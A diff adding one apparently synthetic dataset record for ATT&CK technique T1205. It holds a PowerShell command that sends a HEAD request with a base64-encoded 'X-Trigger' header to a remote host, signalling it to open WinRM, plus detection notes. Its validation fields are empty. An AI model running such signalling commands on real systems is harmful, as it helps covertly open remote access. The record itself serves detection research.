@@ -1,0 +1,22 @@
+{
+  "technique_id": "T1205",
+  "platform": "Windows",
+  "shell": "PowerShell",
+  "command": "Invoke-Command -ScriptBlock { $uri='http://10.0.0.80/'; $b64='WC1UcmlnZ2VyOiBvcGVuLTU5ODU='; $client=New-Object Net.Http.HttpClient; $req=New-Object Net.Http.HttpRequestMessage([Net.Http.HttpMethod]::Head,$uri); $h=[Text.Encoding]::ASCII.GetString([Convert]::FromBase64String($b64)).Split(':'); $req.Headers.Add($h[0].Trim(),$h[1].Trim()); $null=$client.SendAsync($req).Result }",
+  "explanation": "Sends an HTTP HEAD request with a magic header ('X-Trigger: open-5985') as a signaling method. A remote listener can treat this as a cue to allow WinRM or perform a configuration change. Detection: WAF/HTTP logs for non-standard headers carrying directives; frequency analysis of HEAD requests without normal browsing context. No elevation required; UAC not triggered.",
+  "rationale_steps": [
+    "Use an application-layer magic header as a traffic signal.",
+    "Enable remote agent/controller to react by opening a service or port.",
+    "Provide detection guidance via HTTP header auditing."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1205-1108f921-2fcd486a",
+  "source_prompt_hash": "1108f921",
+  "timestamp_utc": "2025-09-30T05:58:00.779201Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
